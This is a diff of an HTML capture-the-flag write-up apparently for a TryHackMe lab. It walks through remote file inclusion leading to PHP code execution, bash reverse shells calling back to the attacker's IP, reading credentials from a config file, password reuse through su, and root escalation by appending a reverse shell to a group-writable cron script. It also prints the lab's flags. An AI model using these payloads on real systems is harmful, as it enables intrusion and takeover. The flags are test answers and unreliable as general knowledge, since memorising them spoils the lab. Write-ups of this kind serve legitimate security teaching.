         <p class="wr-p">With a working authenticated bypass, we tested whether this file-viewing endpoint would let us read arbitrary files off the server's disk:</p>
-        <div class="wr-code">curl -H "Authorization: Bearer &lt;forged_token&gt;" "http://domino.thm/api/files.php?name=/etc/passwd"</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">curl -H "Authorization: Bearer &lt;forged_token&gt;" "http://domino.thm/api/files.php?name=/etc/passwd"</div>
         <p class="wr-p">Result: <span class="wr-inline-code">"Access denied: path must be within /var/www/html/"</span> &mdash; the application <strong>does</strong> enforce a restriction on local file paths, limiting them to its own web root folder. Straightforward LFI was blocked.</p>
         <h3 class="wr-h3">Testing RFI (Remote File Inclusion)</h3>
         <p class="wr-p">The error message specifically said local paths must stay within <span class="wr-inline-code">/var/www/html/</span> &mdash; it said nothing about remote URLs. We tested whether the endpoint would fetch content from a completely different, attacker-controlled server instead of the local filesystem:</p>
-        <div class="wr-code">echo "rfi_test_123" &gt; test.txt
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">echo "rfi_test_123" &gt; test.txt
 python3 -m http.server 8000</div>
-        <div class="wr-code">curl -H "Authorization: Bearer &lt;forged_token&gt;" "http://domino.thm/api/files.php?name=http://10.128.111.101:8000/test.txt"</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">curl -H "Authorization: Bearer &lt;forged_token&gt;" "http://domino.thm/api/files.php?name=http://10.128.111.101:8000/test.txt"</div>
         <p class="wr-p">Our own local web server (port 8000) logged an incoming <span class="wr-inline-code">GET /test.txt</span> request <strong>from the target machine's IP address</strong> &mdash; confirming the target server itself reached out and fetched our file. The local-path restriction check simply didn't apply to remote URLs at all &mdash; a classic oversight where a developer secures one input format (local paths) but forgets an entirely different one (remote URLs) is also possible through the same parameter.</p>
         <h3 class="wr-h3">Escalating from file-read to code execution</h3>
         <p class="wr-p">The final question: does the application just <em>display</em> the fetched remote content as plain text, or does it actually <strong>execute</strong> it as PHP code? This distinction is everything &mdash; the first is a data leak, the second is full remote code execution.</p>
-        <div class="wr-code">echo '&lt;?php system("id"); ?&gt;' &gt; shell_test.php
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">echo '&lt;?php system("id"); ?&gt;' &gt; shell_test.php
 curl -H "Authorization: Bearer &lt;forged_token&gt;" "http://domino.thm/api/files.php?name=http://10.128.111.101:8000/shell_test.php"</div>
         <p class="wr-p"><strong>Result:</strong></p>
-        <div class="wr-code">{"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">{"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}</div>
         <p class="wr-p">This is <strong>real command execution</strong>, not an echo of our text &mdash; <span class="wr-inline-code">system("id")</span> is a PHP function that runs a shell command and returns its output, and we got back an actual Linux <span class="wr-inline-code">id</span> command result. The response format (<span class="wr-inline-code">{"output": ...}</span>) even tells us the application's backend code is specifically designed to display command output as JSON &mdash; meaning the vulnerable code path is very likely using PHP's <span class="wr-inline-code">include()</span> (or similar) on the fetched remote content, which doesn't just read a file's text but actually parses and executes any <span class="wr-inline-code">&lt;?php ?&gt;</span> blocks found inside it. This is a well-documented, dangerous vulnerability class: <strong>RFI leading to RCE via <span class="wr-inline-code">include()</span></strong>.</p>
         <p class="wr-p"><strong>Getting the flag directly through this RCE:</strong></p>
-        <div class="wr-code">echo '&lt;?php system("cat /opt/flag3.txt"); ?&gt;' &gt; shell_test.php
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">echo '&lt;?php system("cat /opt/flag3.txt"); ?&gt;' &gt; shell_test.php
 curl -H "Authorization: Bearer &lt;forged_token&gt;" "http://domino.thm/api/files.php?name=http://10.128.111.101:8000/shell_test.php"</div>
         <p class="wr-p">Result: <span class="wr-inline-code">{"output":"THM{rf1_2_rc3_f00th0ld_fl4g3}\n"}</span></p>
         <p class="wr-p"><strong>Flag 3 obtained: <span class="wr-inline-code">THM{rf1_2_rc3_f00th0ld_fl4g3}</span></strong></p>
         <h3 class="wr-h3">Getting a proper interactive shell</h3>
         <p class="wr-p">One-off commands via <span class="wr-inline-code">system()</span> calls work but are extremely slow for real exploration. We upgraded to a full interactive reverse shell:</p>
-        <div class="wr-code">nc -lvnp 4444</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">nc -lvnp 4444</div>
         <p class="wr-p"><strong>Breakdown:</strong> <span class="wr-inline-code">nc</span> (netcat) &mdash; a general-purpose networking tool, here used to <em>listen</em> for an incoming connection. <span class="wr-inline-code">-l</span> = listen mode. <span class="wr-inline-code">-v</span> = verbose (prints connection activity). <span class="wr-inline-code">-n</span> = skip DNS resolution (avoids delays). <span class="wr-inline-code">-p 4444</span> = listen on port 4444.</p>
-        <div class="wr-code">echo '&lt;?php system("bash -c \"bash -i &gt;&amp; /dev/tcp/10.128.111.101/4444 0&gt;&amp;1\""); ?&gt;' &gt; shell.php</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">echo '&lt;?php system("bash -c \"bash -i &gt;&amp; /dev/tcp/10.128.111.101/4444 0&gt;&amp;1\""); ?&gt;' &gt; shell.php</div>
         <p class="wr-p"><strong>Payload breakdown:</strong></p>
         <ul style="margin:.2rem 0 1.1rem 1.1rem;padding-left:.6rem;font-size:.85rem;color:var(--text2);line-height:1.8">
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">bash -i</span> &mdash; starts an <em>interactive</em> bash shell.</li>
@@ -521,24 +527,24 @@ curl -H "Authorization: Bearer &lt;forged_token&gt;" "http://domino.thm/api/file
         <p class="wr-p">Triggering this payload the same way as before connected a fully interactive shell as the <span class="wr-inline-code">www-data</span> user (the standard low-privilege account Apache/PHP runs as on Linux) back to our netcat listener.</p>
         <h3 class="wr-h3">Stabilizing the shell (a skill worth learning once, permanently)</h3>
         <p class="wr-p">A raw netcat reverse shell has real limitations &mdash; no tab completion, commands sometimes echo twice, <span class="wr-inline-code">Ctrl+C</span> kills your entire connection instead of just the running command, and you can't use full-screen tools like <span class="wr-inline-code">nano</span>. Fixing this is a standard, memorizable sequence:</p>
-        <div class="wr-code">python3 -c 'import pty; pty.spawn("/bin/bash")'</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">python3 -c 'import pty; pty.spawn("/bin/bash")'</div>
         <p class="wr-p">This spawns a proper pseudo-terminal (PTY) &mdash; Python's <span class="wr-inline-code">pty</span> module creates a fuller, more realistic terminal environment than the bare shell netcat initially gives you.</p>
         <p class="wr-p">Then, on your <strong>local</strong> attacking machine (background the reverse shell first with <span class="wr-inline-code">Ctrl+Z</span>):</p>
-        <div class="wr-code">stty raw -echo; fg</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">stty raw -echo; fg</div>
         <ul style="margin:.2rem 0 1.1rem 1.1rem;padding-left:.6rem;font-size:.85rem;color:var(--text2);line-height:1.8">
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">stty raw</span> &mdash; puts your <em>local</em> terminal into "raw" input mode, where keystrokes are passed through more directly instead of being pre-processed.</li>
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">-echo</span> &mdash; tells your local terminal to stop echoing typed characters itself (since the remote pty will now handle echoing them back to you, avoiding the double-typing effect).</li>
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">fg</span> &mdash; brings the backgrounded reverse shell connection back to the foreground.</li>
         </ul>
-        <div class="wr-code">export TERM=xterm</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">export TERM=xterm</div>
         <p class="wr-p">Sets the <span class="wr-inline-code">TERM</span> environment variable, telling terminal-aware programs what type of terminal they're running in &mdash; required for full-screen tools and proper screen-clearing/formatting to work correctly.</p>
       </div>
       <div class="wr-phase" id="flag-4-password-reuse-lateral-movement">
         <h2 class="wr-phase-title">10. Flag 4: Password Reuse / Lateral Movement</h2>
         <p class="wr-p">With a stable shell as <span class="wr-inline-code">www-data</span>, we looked for the application's own configuration file &mdash; reasoning that any file allowing the app to connect to its database would necessarily contain a plaintext (or at least readable) database password somewhere.</p>
-        <div class="wr-code">cat /var/www/html/config.php</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">cat /var/www/html/config.php</div>
         <p class="wr-p"><strong>Result:</strong></p>
-        <div class="wr-code">define('DB_HOST', 'localhost');
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">define('DB_HOST', 'localhost');
 define('DB_NAME', 'nexusdb');
 define('DB_USER', 'app_user');
 define('DB_PASS', 'D3v0ps!2024');
@@ -546,11 +552,11 @@ define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
 define('APP_SECRET', 'nexus_app_k3y_2024');</div>
         <p class="wr-p">The password <span class="wr-inline-code">D3v0ps!2024</span> strongly resembled the <span class="wr-inline-code">devops</span> username pattern we'd already learned about (from the earlier <span class="wr-inline-code">config.enc</span> decryption, which revealed a <span class="wr-inline-code">system_user: devops</span> field).</p>
         <p class="wr-p"><strong>We tested whether this database password was also reused as the actual Linux operating system login password for the <span class="wr-inline-code">devops</span> user:</strong></p>
-        <div class="wr-code">su devops</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">su devops</div>
         <p class="wr-p">(<span class="wr-inline-code">su</span> = "switch user" &mdash; prompts for that user's password and, if correct, starts a new shell session running as them.)</p>
         <p class="wr-p">Entering <span class="wr-inline-code">D3v0ps!2024</span> when prompted succeeded &mdash; the shell prompt changed from <span class="wr-inline-code">www-data@...</span> to <span class="wr-inline-code">devops@...</span>, confirming the switch.</p>
         <p class="wr-p"><strong>Flag obtained from <span class="wr-inline-code">devops</span>'s home directory:</strong></p>
-        <div class="wr-code">cd ~
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">cd ~
 cat user.txt</div>
         <p class="wr-p">Result: <span class="wr-inline-code">THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}</span></p>
         <p class="wr-p"><strong>Flag 4 obtained: <span class="wr-inline-code">THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}</span></strong></p>
@@ -564,27 +570,27 @@ cat user.txt</div>
         <h3 class="wr-h3">Ruling out the obvious paths first</h3>
         <p class="wr-p">Privilege escalation on Linux always follows a standard checklist. We worked through it methodically rather than guessing:</p>
         <p class="wr-p"><strong>1. Sudo permissions:</strong></p>
-        <div class="wr-code">sudo -l</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">sudo -l</div>
         <p class="wr-p">Result: <span class="wr-inline-code">Sorry, user devops may not run sudo on tryhackme-2404.</span> &mdash; dead end, <span class="wr-inline-code">devops</span> has no sudo rights at all.</p>
         <p class="wr-p"><strong>2. SUID binaries</strong> (files that run with the file <em>owner's</em> privileges regardless of who executes them):</p>
-        <div class="wr-code">find / -perm -4000 -type f 2&gt;/dev/null</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">find / -perm -4000 -type f 2&gt;/dev/null</div>
         <p class="wr-p"><strong>Command breakdown:</strong> <span class="wr-inline-code">find /</span> searches starting from the root of the filesystem. <span class="wr-inline-code">-perm -4000</span> matches files that have the SUID bit set (<span class="wr-inline-code">4000</span> in octal permission notation represents the SUID flag specifically). <span class="wr-inline-code">-type f</span> restricts results to regular files (not directories). <span class="wr-inline-code">2&gt;/dev/null</span> redirects any "permission denied" error messages (which would otherwise clutter the output, since we can't read every folder on the system) to <span class="wr-inline-code">/dev/null</span> &mdash; a special file that simply discards anything written to it, effectively silencing those errors.</p>
         <p class="wr-p">Result: only completely standard, stock Ubuntu system binaries (<span class="wr-inline-code">passwd</span>, <span class="wr-inline-code">sudo</span>, <span class="wr-inline-code">su</span>, <span class="wr-inline-code">mount</span>, etc.) &mdash; nothing custom, nothing exploitable here.</p>
         <p class="wr-p"><strong>3. Static cron configuration files:</strong></p>
-        <div class="wr-code">cat /etc/crontab
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">cat /etc/crontab
 ls -la /etc/cron.d/ /etc/cron.daily/</div>
         <p class="wr-p">Result: only standard, unmodified Ubuntu system maintenance jobs (log rotation, package update checks, etc.) &mdash; again, nothing custom or planted.</p>
         <h3 class="wr-h3">Live process monitoring with pspy</h3>
         <p class="wr-p">Static configuration files don't tell the whole story &mdash; cron jobs can also be registered in places that are harder to statically enumerate, such as an individual user's personal crontab. The reliable way to catch these is to <strong>watch what actually runs</strong>, live, over time.</p>
-        <div class="wr-code">/opt/tools/pspy64</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">/opt/tools/pspy64</div>
         <p class="wr-p"><strong>What pspy does and why it doesn't need root:</strong> it works by repeatedly scanning the <span class="wr-inline-code">/proc</span> filesystem (a special Linux virtual filesystem that exposes live information about every currently running process) at a very high frequency, and printing every new process it spots &mdash; including who launched it (<span class="wr-inline-code">UID</span>) and its full command line. Crucially, reading basic process information from <span class="wr-inline-code">/proc</span> doesn't require any special privileges, which is why an unprivileged user can run this and still observe root-owned processes starting up.</p>
         <p class="wr-p"><strong>After roughly a minute, this appeared:</strong></p>
-        <div class="wr-code">20:32:01 CMD: UID=0  /bin/bash /opt/monitoring/health_report.sh</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">20:32:01 CMD: UID=0  /bin/bash /opt/monitoring/health_report.sh</div>
         <p class="wr-p">A script, running automatically as <strong>root</strong>, on some kind of schedule we hadn't found in the static config files (it turned out to be registered elsewhere, not shown in the specific files we'd checked).</p>
         <h3 class="wr-h3">Checking if we could modify a root-run script</h3>
-        <div class="wr-code">ls -la /opt/monitoring/health_report.sh</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">ls -la /opt/monitoring/health_report.sh</div>
         <p class="wr-p">Result:</p>
-        <div class="wr-code">-rwxrwxr-- 1 root devops 537 May 18 10:41 /opt/monitoring/health_report.sh</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">-rwxrwxr-- 1 root devops 537 May 18 10:41 /opt/monitoring/health_report.sh</div>
         <p class="wr-p"><strong>Understanding Linux file permission notation, since this is the entire key to this final step:</strong></p>
         <p class="wr-p">The permission string <span class="wr-inline-code">-rwxrwxr--</span> breaks into four parts:</p>
         <ul style="margin:.2rem 0 1.1rem 1.1rem;padding-left:.6rem;font-size:.85rem;color:var(--text2);line-height:1.8">
@@ -596,14 +602,14 @@ ls -la /etc/cron.d/ /etc/cron.daily/</div>
         <p class="wr-p">The <span class="wr-inline-code">devops</span> user we were currently logged in as <strong>is a member of the <span class="wr-inline-code">devops</span> group</strong>, and that group has <strong>write</strong> permission on this file. This is the entire vulnerability: <strong>a script that root executes on a schedule can be edited by a non-root user.</strong></p>
         <p class="wr-p"><strong>The exploitation logic, explained conceptually:</strong> cron doesn't care who last edited a script &mdash; it simply runs whatever code is currently inside the file, using the permissions of whichever user account the cron job is configured to run as (here, root). If we can edit the file's contents, then whatever we add will execute <em>as root</em> the very next time the schedule triggers &mdash; we don't need to find any complex bug in the script's logic at all; we just need write access and patience.</p>
         <h3 class="wr-h3">The exploit</h3>
-        <div class="wr-code">nc -lvnp 5555</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">nc -lvnp 5555</div>
         <p class="wr-p">(a fresh listener, on our local machine, on a new unused port)</p>
-        <div class="wr-code">echo 'bash -c "bash -i &gt;&amp; /dev/tcp/10.128.111.101/5555 0&gt;&amp;1"' &gt;&gt; /opt/monitoring/health_report.sh</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">echo 'bash -c "bash -i &gt;&amp; /dev/tcp/10.128.111.101/5555 0&gt;&amp;1"' &gt;&gt; /opt/monitoring/health_report.sh</div>
         <p class="wr-p">Note the use of <span class="wr-inline-code">&gt;&gt;</span> (append) rather than <span class="wr-inline-code">&gt;</span> (overwrite) &mdash; this adds our malicious line to the <em>end</em> of the existing legitimate script rather than destroying its original monitoring functionality. This is both good real-world practice (minimizing unnecessary disruption/detection) and simply the correct approach here, since we only need our line to <em>also</em> run, not to replace anything.</p>
         <p class="wr-p">Within roughly a minute &mdash; matching the once-per-minute schedule pspy had already shown us &mdash; the cron daemon executed the modified script as root, which ran our appended reverse shell command, connecting back to our listener:</p>
-        <div class="wr-code">root@tryhackme-2404:~#</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">root@tryhackme-2404:~#</div>
         <p class="wr-p"><strong>Full root access achieved.</strong></p>
-        <div class="wr-code">cat /root/root.txt</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">cat /root/root.txt</div>
         <p class="wr-p">Result: <span class="wr-inline-code">THM{pr1v3sc_cr0n_r00t_fl4g5}</span></p>
         <p class="wr-p"><strong>Flag 5 obtained: <span class="wr-inline-code">THM{pr1v3sc_cr0n_r00t_fl4g5}</span></strong></p>
         <h3 class="wr-h3">The concept: Cron-Based Privilege Escalation via Weak File Permissions</h3>
